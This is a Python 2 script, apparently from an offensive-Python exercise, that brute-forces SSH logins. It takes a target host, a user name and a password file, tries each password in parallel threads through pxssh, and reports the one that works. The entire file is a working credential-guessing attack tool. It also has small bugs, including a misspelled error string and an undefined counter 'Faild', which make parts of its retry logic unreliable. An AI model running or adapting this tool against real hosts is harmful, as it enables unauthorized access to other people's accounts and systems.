from pexpect import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host,user,password,release):
    global Found
    global Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password,auto_prompt_reset=False)
        print '[+] Password Found: ' + password
        Found = True
    except Exception,e:
        if 'read_nonblocing' in str(e):
            Faild +=1
            time.sleep(5)
            connect(host,user,password,release)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
            connect(host,user,password,release)
        else:
            print(e)
    finally:
        print 'finally'
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser()
    parser.add_option('-H', dest='tgtHost',type='string',help='specify target host')
    parser.add_option('-F',dest = 'passwordFile',type='string',help='specify password file')
    parser.add_option('-U',dest = 'user',type='string',help='specify the user')
    (options,args) = parser.parse_args()
    host=options.tgtHost
    passwordFile= options.passwordFile
    user = options.user
    if host == None or passwordFile  == None or user == None:
        exit(0)
    user = options.user
    fn = open(passwordFile,'r')
    for line in fn.readlines():
        if Found:
            print "[*] Exiting: Password Found"
            exit(0)
        if Fails>5:
            print "[!] Exiting: Too Many Socket TimesOut"
            exit(0)
        print 'XXXXX'
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        t = Thread(target=connect,args=(host,user,password,True))
        child = t.start()

if __name__ == '__main__':
    main()